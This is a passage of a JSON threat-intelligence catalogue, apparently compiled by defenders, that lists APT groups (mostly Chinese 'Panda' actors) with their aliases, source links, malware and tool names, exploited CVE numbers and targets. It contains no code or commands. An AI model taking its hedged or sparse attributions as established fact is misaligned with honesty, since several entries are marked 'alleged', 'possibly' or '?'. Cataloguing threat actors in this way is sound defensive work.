Panda"], "links": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "tools": ["Spear-phishing", "URL \u201cweb bugs\u201d and scheduled tasks to automate credential harvesting"], "targets": "Upstream providers (e.g., law firms and managed service providers) to support additional intrusions against high-profile assets", "description": null}, {"operations": [], "comment": "Listed slide 4", "attck_id": null, "names": ["Tonto Team", "Karma Panda", "Karma Panda", "CactusPete", "CactusPete", "Bisonal (malware), Lone Ranger"], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf", "https://securelist.com/apt-trends-report-q1-2019/90643/"], "tools": [], "targets": "Dissident groups", "description": null}, {"operations": [], "comment": "Listed slide 4", "attck_id": null, "names": ["temp.bottle", "Keyhole Panda", "Keyhole Panda"], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "tools": [], "targets": "Electronics & Communications", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Kryptonite Panda"], "links": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "tools": ["8.t exploit document builder"], "targets": "Cambodia", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Temp.Hex", "Mustang Panda", "HoneyMyte", "BRONZE PRESIDENT"], "links": ["https://www.secureworks.com/research/bronze-president-targets-ngos", "https://securelist.com/apt-trends-report-q3-2019/94530/", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations#When:17:14:00Z"], "tools": ["Cobalt Strike", "PlugX", "ORat", "RCSession", "Nbtscan", "Nmap", "Wmiexec", "China Chopper web shell"], "targets": "Mining sector in Mongolia, private individuals |=| gathering geo-political and economic intelligence, NGOs, political & law enforcement org in South and East Asia", "description": null}, {"operations": [], "comment": null, "attck_id": "G0014", "names": ["Night Dragon", "Night Dragon"], "links": ["https://kc.mcafee.com/corporate/index?page=content&id=KB71150", "http://www.mcafee.com/us/resources/white-papers/wp-global-energy-cyberattacks-night-dragon.pdf"], "tools": [], "targets": "A threat actor compromised U.S. oil companies through spear phishing and remote administration tools. Oil, Energy and Petrochemical (OpNightDragon)", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Nightshade Panda", "Nightshade Panda", "APT9"], "links": ["https://otx.alienvault.com/pulse/55bbc68e67db8c2d547ae393/"], "tools": ["Poison Ivy", "PlugX", "BIGJOLT", "FUNRUN", "GH0ST", "HOMEUNIX", "JIM A", "PHOTO", "POISON IVY", "SKINNYGENE", "SOGU", "VICEROY", "VIPSH ELL", "WETHEAD", "XDOOR", "ZXSHELL"], "targets": "HK, US, SG, MY, JP, IN, KR, TH, TW - Aerospace, Agriculture, Construction, Energy, Healthcare, ,High Tech, Media, Transportation", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Nomad Panda"], "links": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "tools": ["8.t exploit document builder"], "targets": "Central Asian nations", "description": null}, {"operations": [], "comment": "Mentioned in 2014 Crowdstrike Global Threat Intel Report pg 22", "attck_id": null, "names": ["Pale Panda"], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "tools": ["PlugX"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Pirate Panda", "Pirate Panda", "KeyBoys"], "links": ["https://citizenlab.ca/2016/11/parliament-keyboy/", "https://blogs.cisco.com/security/scope-of-keyboy-targeted-malware-attacks", "https://blog.rapid7.com/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india/", "http://www.crowdstrike.com/blog/rhetoric-foreshadows-cyber-activity-in-the-south-china-sea/", "http://www.pwc.co.uk/issues/cyber-security-data-privacy/research/the-keyboys-are-back-in-town.html"], "tools": [], "targets": null, "description": "Southeast Asia"}, {"operations": [], "comment": "Listed slide 4", "attck_id": null, "names": ["Poisonous Panda", "Poisonous Panda"], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "tools": [], "targets": "Energy technology, G20, NGOs, Dissident Groups", "description": null}, {"operations": [], "comment": "Mentioned pg 22 & 42", "attck_id": null, "names": ["Predator Panda", "Predator Panda"], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "tools": ["PlugX"], "targets": "Southeast Asia", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Radio Panda", "Radio Panda"], "links": [], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Listed in 2014 Global Threat Report (pg 9) - observed in Umbrella Revolution related activity (pg 28)", "attck_id": null, "names": ["Sabre Panda"], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "tools": [], "targets": "Umbrella Revolution", "description": null}, {"operations": [], "comment": "Listed in 2014 Global Threat Report - no more details pg 9", "attck_id": null, "names": ["Spicy Panda"], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "tools": [], "targets": null, "description": null}, {"operations": ["Dust Storm", "Cloud Hopper", "ChessMaster"], "comment": "Profile slide 13 & 14", "attck_id": "G0045", "names": ["MenuPass Team", "Stone Panda", "Stone Panda", "APT10", "Red Apollo, CVNX, POTASSIUM, Cloud Hopper, Hogfish"], "links": ["https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf", "https://www.isightpartners.com/2016/02/threatscape-media-highlights-update-week-february-24th/", "https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://threatpost.com/poison-ivy-rat-spotted-in-three-new-attacks/102022/", "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html", "https://www.cylance.com/hubfs/2015_cylance_website/assets/operation-dust-storm/Op_Dust_Storm_Report.pdf", "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf", "http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem", "https://www.us-cert.gov/ncas/alerts/TA17-117A", "http://researchcenter.paloaltonetworks.com/2017/02/unit42-menupass-returns-new-malware-new-attacks-japanese-academics-organizations/", "http://blog.trendmicro.com/trendlabs-security-intelligence/chessmaster-cyber-espionage-campaign/", "https://blog.ensilo.com/uncovering-new-activity-by-apt10", "https://www.lac.co.jp/lacwatch/people/20180521_001638.html"], "tools": ["Poison Ivy", "EvilGrab", "IEChecker", "ChChes", "PlugX", "RedLeaves", "Quasar", "CobaltStrike", "Trochilus", "UPPERCUT (aka ANEL)", "StoneNetLoader"], "targets": "Healthcare; Pharma, Defense, Aerospace, Government, MSP, ", "description": "Data exfil over common TCP services (RDP, HTTPS)"}, {"operations": ["admin@338"], "comment": "\u201cPdPD\u201d (50 64 50 44) marker for encrypted binaries", "attck_id": null, "names": ["admin@338", "338 Team", "Temper Panda", "Temper Panda", "Team338", "Admin338"], "links": ["https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html", "https://www.fireeye.com/blog/threat-research/2013/10/know-your-enemy-tracking-a-rapidly-evolving-apt-actor.html", "https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html"], "tools": ["Poison Ivy", "jRat", "LOWBALL", "BUBBLEWRAP"], "targets": "Target Gov + Military, DIB, Finiancial/Think Tanks, Telco, Academia, Religious organisations", "description": null}, {"operations": [], "comment": "Listed slide 8", "attck_id": null, "names": ["Test Panda", "Test Panda"], "links": ["http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Listed slide 4", "attck_id": null, "names": ["Toxic Panda", "Toxic Panda"], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "tools": [], "targets": "Dissident Groups", "description": null}, {"operations": [], "comment": "Listed slide 4", "attck_id": null, "names": ["Union Panda", "Union Panda"], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "tools": [], "targets": "Industrial companies", "description": null}, {"operations": ["th3bug", "Wocao"], "comment": "Listed slide 12", "attck_id": null, "names": ["APT20", "Violin Panda", "Violin Panda", "APT8", "Covert Grove"], "links": ["https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/", "http://www.slideshare.net/CrowdStrike/crowdcast-monthly-operationalizing-intelligence-34141777", "http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the_nitro_attacks.pdf"], "tools": ["Poison Ivy", "CAKELOG", "CANDYCLOG", "COOKIECLOG", "CETTRA"], "targets": "Energy, Chemical Industry, Healthcare and Pharma", "description": null}, {"operations": [], "comment": "Mentioned in 2014 Global Threat Report using PlugX (pg 22)", "attck_id": null, "names": ["Wet Panda", "Wet Panda"], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf", "http://www.slideshare.net/CrowdStrike/crowdcast-monthly-operationalizing-intelligence-34141777"], "tools": ["PlugX"], "targets": "Energy ", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["?"], "links": ["http://pwc.blogs.com/cyber_security_updates/2016/03/taiwant-election-targetting.html", "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/", "https://citizenlab.org/2016/04/between-hong-kong-and-burma/"], "tools": ["UP007", "SLServer", "Grabber", "T9000", "Kivars", "PlugX", "Gh0StRAT", "Agent.XST"], "targets": "Tibetans, Hong Kong, Taiwanese interests and human rights workers, Uyghur Interests", "description": "Active"}, {"operations": [], "comment": null, "attck_id": null, "names": ["?"], "links": ["https://web.archive.org/web/20151217200415/https://www.fidelissecurity.com/sites/default/files/FTA_1020_Fidelis_Inocnation_FINAL.pdf"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["?"], "links": ["https://www.threatconnect.com/operation-poisoned-helmand/"], "tools": [], "targets": "Afghan Government", "description": "Watering Hole"}, {"operations": [], "comment": null, "attck_id": null, "names": ["?"], "links": ["http://web.archive.org/web/20081011233241/http://www.breitbart.com/news/2005/12/12/051212224756.jwmkvntb.html"], "tools": [], "targets": "USA", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Maverick Panda", "?", "Sykipot", "PLA Navy"], "links": ["https://www.alienvault.com/open-threat-exchange/blog/new-sykipot-developments", "http://blog.trendmicro.com/trendlabs-security-intelligence/sykipot-now-targeting-us-civil-aviation-sector-information/"], "tools": [], "targets": "DIB (Defence Industrial Base) and other government organizations", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Calypso", "Links to Skyipot, Pitty Tiger, Comment Crew, Mirage"], "links": ["https://www.ptsecurity.com/ww-en/analytics/calypso-apt-2019/"], "tools": ["Byebe", "CMStar", "Calypso RAT", "PlugX"], "targets": null, "description": null}, {"operations": [], "comment": "Group based in Xiamen, in same area as PLA Navy. Likely a navy SIGINT TRB", "attck_id": "G0081", "names": ["KeyBoy", "Tropic Trooper"], "links": ["http://researchcenter.paloaltonetworks.com/2016/11/unit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy/", "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/"], "tools": ["Poison Ivy", "PCShare", "Yahoyah"], "targets": "Taiwan, High-Tech in Asia, Taiwanese Government, Fossil Fuel Provider, Taiwanese, Philippine, and Hong Kong targets, focusing on their government, healthcare, transportation, and high-tech industries", "description": null}, {"operations": [], "comment": "Overlap with BARIUM and Winnti", "attck_id": "G0096", "names": ["APT41", "APT41"], "links": ["https://www.fireeye.com/blog/threat-research/2019/10/messagetap-who-is-reading-your-text-messages.html", "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html", "https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html"], "tools": ["CRACKSHOT", "GEARSHIFT", "HIGHNOON", "JUMPALL", "POISONPLUG", "HOTCHAI", "LATELUNCH", "LIFEBOAT", "LOWKEY", "NJRAT", "PACMAN", "PHOTO", "POTROAST", "ROCKBOOT", "SAGEHIRE", "SWEETCANDLE", "SOGU", "TERA", "TIDYELF", "WIDETONE", "WINTERLOVE", "XDoor", "Xmrig", "ZxShell"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Poison Carp"], "links": ["https://www.volexity.com/blog/2019/09/02/digital-crackdown-large-scale-surveillance-and-exploitation-of-uyghurs/", "https://citizenlab.ca/2019/09/poison-carp-tibetan-groups-targeted-with-1-click-mobile-exploits/", "https://googleprojectzero.blogspot.com/2019/08/a-very-deep-dive-into-ios-exploit.html"], "tools": [], "targets": "This threat actor targets smartphones associated with Tibetan and Uyghur activists for espionage purposes.", "description": "Strategic web compromise (watering hole)"}, {"operations": [], "comment": null, "attck_id": null, "names": ["AVIVORE"], "links": ["https://www.contextis.com/en/blog/avivore", "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2019-CTI-005.pdf"], "tools": ["PlugX", "Mimikatz", "WmiExec"], "targets": "aerospace and defence industries in the UK and Europe", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["APT-C-01", "PoisonVine, PoisonIvy"], "links": ["https://www.virusbulletin.com/virusbulletin/2019/11/vb2019-paper-vine-climbing-over-great-firewall-longterm-attack-against-china/", "https://www.virusbulletin.com/uploads/pdf/conference_slides/2019/VB2019-GuPan.pdf", "https://www.netscout.com/sites/default/files/2019-02/SECR_001_EN-1901%20-%20NETSCOUT%20Threat%20Intelligence%20Report%202H%202018.pdf", "http://blogs.360.cn/post/APT_C_01_en.html", "https://ti.qianxin.com/blog/articles/analysis-of-apt-c-01/", "https://ti.qianxin.com/uploads/2018/09/20/6f8ad451646c9eda1f75c5d31f39f668.pdf"], "tools": ["Poison Ivy", "ZxShell", "Kanbox RAT", "CVE-2012-0158", "CVE-2014-6352", "CVE-2017-8759"], "targets": "government agencies, military individuals, research institutes, maritime agencies", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["DarkUniverse"], "links": ["https://securelist.com/darkuniverse-the-mysterious-apt-framework-27/94897/", "https://securelist.com/new-uyghur-and-tibetan-themed-attacks-using-pdf-exploits/35465/", "https://www.alienvault.com/blogs/labs-research/latest-adobe-pdf-exploit-used-to-target-uyghur-and-tibetan-activists"], "tools": ["ItaDuke"], "targets": "Tibet and Uyghur activists, Syria, Iran, Afghanistan, Tanzania, Ethiopia, Sudan, Russia, Belarus and the United Arab Emirates", "description": "Spearphishing w/CVE-2013-0640 weaponized PDF"}, {"operations": [], "comment": null, "attck_id": null, "names": ["Taskmasters"], "links": ["https://www.ptsecurity.com/ww-en/analytics/operation-taskmasters-2019/", "https://www.youtube.com/watch?v=XYuclHsoQO4&feature=youtu.be"], "tools": ["RemShell", "404-Input-shell", "Eternal Blue", "Scheduled Tasks"], "targets": "Military, government, telecommunication, small businesses", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["GALLIUM"], "links": ["https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/", "https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers"], "tools": ["BlackMould", "China Chopper", "PoisonIvy", "QuarkBandit", "Htran", "NBTScan", "PsExec", "Winrar", "Netcat"], "targets": "Telecom", "description": null}, {"operations": [], "comment": null, "attck_id": "G0075", "names": ["RANCOR"], "links": ["https://unit42.paloaltonetworks.com/rancor-cyber-espionage-group-uses-new-custom-malware-to-attack-southeast-asia/", "https://research.checkpoint.com/rancor-the-year-of-the-phish/", "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/", "https://meltx0r.github.io/tech/2019/09/11/rancor-apt.html"], "tools": ["KHRAT Trojan", "Derusbi", "Dudell", "DDKONG Plugin"], "targets": "South-East Asia", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["ChinaZ"], "links": ["https://www.intezer.com/blog-chinese-apts-rising-ia-community-may-2019/", "https://www.intezer.com/blog-chinaz-introduces-new-undetected-malware/", "https://www.botconf.eu/wp-content/uploads/2014/12/2014-2.10-Chinese-Chicken-Multiplatform-DDoS-Botnets.pdf", "https://www.intezer.com/blog-chinaz-relations/", "https://blog.malwaremustdie.org/2016/10/mmd-0060-2016-linuxudpfker-and-chinaz.html", "https://news.drweb.com/show/?i=9272&lng=en&c=5", "https://blog.malwaremustdie.org/2015/08/mmd-0039-2015-chinaz-made-new-malware.html"], "tools": ["Linux.BackDoor.Xnote.1", "Linux/BillGates.Lite", "Linux/UDPfker"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Slap Bear", "APT-C-37", "Pat/Patted Bear", "Papa Bear"], "links": ["https://cybersecurity.att.com/blogs/labs-research/alien-labs-2019-analysis-of-threat-groups-molerats-and-apt-c-37", "https://mp.weixin.qq.com/s/lUtXwWjPVMHXfR6oLnXYhQ", "http://blogs.360.cn/post/analysis-of-apt-c-37.html", "https://zhuanlan.kanxue.com/article-8168.htm"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Goldmouse/Gold Mouse/Gold Rat", "APT-C-27"], "links": ["https://www.pbwcz.cz/Reporty/20180723_CSE_APT27_Syria_v1.pdf", "https://ti.360.net/blog/articles/apt-c-27-(goldmouse):-suspected-target-attack-against-the-middle-east-with-winrar-exploit-en/", "https://blog.360totalsecurity.com/en/the-sample-analysis-of-apt-c-27s-recent-attack/"], "tools": [], "targets": "Middle East", "description": null}]}}, {}, null, {"unknown": {"actors": [{"operations": [], "comment": "Links to Energetic Bear", "attck_id": null, "names": ["Crouching Yeti"], "links": ["https://securelist.com/blog/research/65240/energetic-bear-more-like-a-crouching-yeti/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["NewRomanic Cyber Army Team "], "links": ["http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf"], "tools": ["Whois Wiper"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["The Whois Hacking Team"], "links": ["http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["ItaDuke"], "links": [], "tools": [], "targets": null, "description": null}, {"operations": ["Roaming Tiger", "TOPNEWS"], "comment": null, "attck_id": null, "names": ["Roaming Tiger"], "links": ["https://speakerdeck.com/ashley920/into-the-fog-the-return-of-icefog-apt", "http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/"], "tools": ["SOGU", "GHOST", "TEMPFUN", "FIRSTBLOOD", "PI"], "targets": "Gov, Oil and Gas, Aerospace, Defense in UZ, MN, MY, RU, BY, KZ, US, Tibet, UA", "description": null}, {"operations": ["Blue Termite"], "comment": "Possible link to APT10", "attck_id": null, "names": ["Cloudy Omega", "Emdivi", "Blue Termite"], "links": ["http://blog.trendmicro.com/trendlabs-security-intelligence/attackers-target-organizations-in-japan-transform-local-sites-into-cc-servers-for-emdivi-backdoor/", "https://web.archive.org/web/20160303010953/http://www.kaspersky.com/about/news/virus/2015/Blue-Termite-A-Sophisticated-Cyber-Espionage-Campaign-is-After-High-Profile-Japanese-Targets", "http://www.kaspersky.com/about/news/virus/2015/Blue-Termite-A-Sophisticated-Cyber-Espionage-Campaign-is-After-High-Profile-Japanese-Targets", "http://www.symantec.com/connect/blogs/operation-cloudyomega-ichitaro-zero-day-and-ongoing-cyberespionage-campaign-targeting-japan"], "tools": ["Emdivi"], "targets": "This threat actor is believed to have been responsible for the Japan Pension Service incident. It is also known as Emdivi\u00a0and Cloudy Omega.", "description": null}, {"operations": [], "comment": "Alleged to be China based", "attck_id": null, "names": ["Suckfly"], "links": ["http://www.symantec.com/connect/blogs/indian-organizations-targeted-suckfly-attacks", "http://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates"], "tools": ["tcpscan", "smbscan", "wce", "gsecdump", "credentialdumper"], "targets": "South Korea, India", "description": null}, {"operations": ["Groundbait"], "comment": null, "attck_id": null, "names": ["?"], "links": ["http://www.welivesecurity.com/wp-content/uploads/2016/05/Operation-Groundbait.pdf"], "tools": ["Win32/Prikormka"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["SPIVY"], "links": ["http://researchcenter.paloaltonetworks.com/2016/04/unit42-new-poison-ivy-rat-variant-targets-hong-kong-pro-democracy-activists/"], "tools": ["PoisonIvy", "CVE-2015-2545"], "targets": "Organisations in Hong Kong", "description": null}, {"operations": [], "comment": "C2 Server in Japan", "attck_id": null, "names": ["EvilPost"], "links": ["https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html"], "tools": ["CVE-2015-2545 "], "targets": "Japanese Defence Sector", "description": null}, {"operations": [], "comment": "probably related to NetTraveller and DragonOK", "attck_id": null, "names": ["Danti"], "links": ["https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/"], "tools": ["CVE-2015-2545 "], "targets": "Kazakhstan, Kyrgyzstan, Uzbekistan, Myanmar, Nepal and the Philippines", "description": null}, {"operations": ["IronGate"], "comment": "MitM, Sandbox Evasion", "attck_id": null, "names": ["?"], "links": ["https://www.fireeye.com/blog/threat-research/2016/06/irongate_ics_malware.html"], "tools": [], "targets": "Industrial Control Systems (ICS)", "description": null}, {"operations": [], "comment": "Tracked by Crowdstrike", "attck_id": null, "names": ["Evanescent Bat"], "links": [], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["NewsBeef"], "links": ["https://securelist.com/blog/software/74503/freezer-paper-around-free-meat/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Poseidon"], "links": ["https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/"], "tools": [], "targets": null, "description": null}, {"operations": ["Operation Ghoul"], "comment": "Financial interests", "attck_id": null, "names": ["Ghoul"], "links": ["https://securelist.com/blog/research/75718/operation-ghoul-targeted-attacks-on-industrial-and-engineering-organizations/"], "tools": [], "targets": "mainly industrial, engineering and manufacturing organizations in more than 30 countries", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["FruityArmor"], "links": ["https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/", "https://securelist.com/blog/research/76396/windows-zero-day-exploit-used-in-targeted-attacks-by-fruityarmor-apt/", "https://securelist.com/zero-day-in-windows-kernel-transaction-manager-cve-2018-8611/89253/"], "tools": ["MS16-120 / CVE-2016-3393 0day exploits", "0day CVE-2018-8453", "PowerShell backdoor", "CVE-2018-8611"], "targets": "Middle Eastern region", "description": null}, {"operations": [], "comment": "Tracked by Cylance", "attck_id": null, "names": ["Snake Wine"], "links": ["https://www.cylance.com/en_us/blog/the-deception-project-a-new-japanese-centric-threat.html"], "tools": ["Ham Backdoor", "Tofu Backdoor"], "targets": "Japanese Targets", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Maganese", "APT5"], "links": ["https://twitter.com/bkMSFT/status/1164881831830929411", "https://www.fireeye.com/current-threats/apt-groups.html"], "tools": ["Leouncia"], "targets": "Telecommunications and technology companies, particularly in Southeast Asia, as well as high-tech manufacturing firms and military application technology", "description": null}, {"operations": [], "comment": "Tracked by Symantec", "attck_id": null, "names": ["Sowbug"], "links": ["https://www.symantec.com/connect/blogs/sowbug-cyber-espionage-group-targets-south-american-and-southeast-asian-governments"], "tools": ["Felismus"], "targets": "South American and Southeast Asian governments", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["TRISIS", "Triton"], "links": ["https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html", "https://ics-cert.us-cert.gov/MAR-17-352-01-HatMan%E2%80%94Safety-System-Targeted-Malware", "https://www.fireeye.com/blog/threat-research/2018/10/triton-attribution-russian-government-owned-lab-most-likely-built-tools.html"], "tools": [], "targets": null, "description": null}, {"operations": ["Olympic Destroyer"], "comment": "Highly sophisticated false flag", "attck_id": null, "names": ["?"], "links": ["https://securelist.com/the-devils-in-the-rich-header/84348/", "https://www.endgame.com/blog/technical-blog/stopping-olympic-destroyer-new-process-injection-insights", "https://securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/", "https://www.recordedfuture.com/olympic-destroyer-malware/", "http://blog.talosintelligence.com/2018/02/olympic-destroyer.html", "https://research.checkpoint.com/new-strain-of-olympic-destroyer-droppers/", "https://blog.talosintelligence.com/2018/02/who-wasnt-responsible-for-olympic.html", "http://www.intezer.com/2018-winter-cyber-olympics-code-similarities-cyber-attacks-pyeongchang/"], "tools": ["Olympic Destroyer (destructive malware)", "PsExec"], "targets": "Winter Olympics in Pyeongchang, South Korea; adversaries looking for information from the games but instead they are aimed to disrupt the games", "description": null}, {"operations": [], "comment": "Possibly FIN10 Tracked by Symantec cybercriminal", "attck_id": null, "names": ["Orangeworm"], "links": ["https://lab52.io/blog/orangeworm-group-kwampirs-analysis-update/", "https://www.databreaches.net/team-orangeworm-claims-to-be-dumping-carepartners-data-from-2018-breach/", "https://www.symantec.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia", "https://www.databreaches.net/team_orangeworm-issues-new-threats-to-carepartners/"], "tools": ["Kwampirs backdoor"], "targets": "Known victims include healthcare providers, pharmaceuticals, IT solution providers for healthcare and equipment manufacturers that serve the healthcare industry, likely for the purpose of corporate espionage", "description": null}, {"operations": [], "comment": "cybercriminal", "attck_id": null, "names": ["FIN10"], "links": ["https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin10.pdf"], "tools": [], "targets": "Casinos and mining (natural resources)", "description": null}, {"operations": ["PLEAD", "Shrouded Crossbow", "Waterbear"], "comment": "\"PLEAD\" and Waterbear labels apply to actors, malware and operations", "attck_id": null, "names": ["BlackTech"], "links": ["https://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/", "https://blog.jpcert.or.jp/2018/06/plead-downloader-used-by-blacktech.html", "https://www.welivesecurity.com/2018/07/09/certificates-stolen-taiwanese-tech-companies-plead-malware-campaign/", "https://documents.trendmicro.com/assets/appendix-following-the-trail-of-blacktechs-cyber-espionage-campaigns.pdf", "https://blog.trendmicro.com/trendlabs-security-intelligence/following-trail-blacktech-cyber-espionage-campaigns/", "https://blogs.jpcert.or.jp/en/2019/11/icondown-downloader-used-by-blacktech.html", "https://blog.trendmicro.com/trendlabs-security-intelligence/waterbear-is-back-uses-api-hooking-to-evade-security-product-detection/", "https://blogs.jpcert.or.jp/en/2019/09/tscookie-loader.html", "https://blogs.jpcert.or.jp/en/2018/03/malware-tscooki-7aa0.html"], "tools": [], "targets": "targets in East Asia, particularly Taiwan, and occasionally, Japan and Hong Kong", "description": null}, {"operations": ["Shaheen"], "comment": null, "attck_id": null, "names": ["White Company"], "links": ["https://threatvector.cylance.com/en_us/home/the-white-company-inside-the-operation-shaheen-espionage-campaign.html"], "tools": [], "targets": "Pakistani government and military \u2014 in particular, the Pakistani Air Force", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Silence Group"], "links": ["https://www.group-ib.com/resources/threat-research/silence_2.0.going_global.pdf", "https://www.group-ib.com/media/silence/", "https://reaqta.com/2019/01/silence-group-targeting-russian-banks/", "https://www.group-ib.com/resources/threat-research/silence_moving-into-the-darkside.pdf"], "tools": ["Malicious CHM files", "Truebot"], "targets": "Targets are located in Eastern Europe and Russia", "description": null}, {"operations": ["SingHealth"], "comment": "Has been seen targeting organisations based in Singaport and additionally some multinational organizations with a presence in Singapore.", "attck_id": null, "names": ["Whitefly"], "links": ["https://www.symantec.com/blogs/threat-intelligence/whitefly-espionage-singapore"], "tools": ["CVE-2016-0051", "Vcrodat", "Nibatad", "Termite", "Mimikatz"], "targets": "Healthcare, media, telecommunications, and engineering sectors. Singapore", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Shaoye", "Roaming Mantis"], "links": ["https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/moqhao-related-android-spyware-targeting-japan-and-korea-found-on-google-play/", "https://securelist.com/roaming-mantis-part-3/88071/", "https://securelist.com/roaming-mantis-part-iv/90332/", "https://securelist.com/roaming-mantis-uses-dns-hijacking-to-infect-android-smartphones/85178/", "https://securelist.com/it-threat-evolution-q2-2019/91994/", "https://securelist.com/roaming-mantis-dabbles-in-mining-and-phishing-multilingually/85607/"], "tools": ["malicious APK"], "targets": "Russia, Japan, India, Bangladesh, Kazakhstan, Azerbaijan, Iran and Vietnam", "description": null}, {"operations": [], "comment": "Most likely Iranian group", 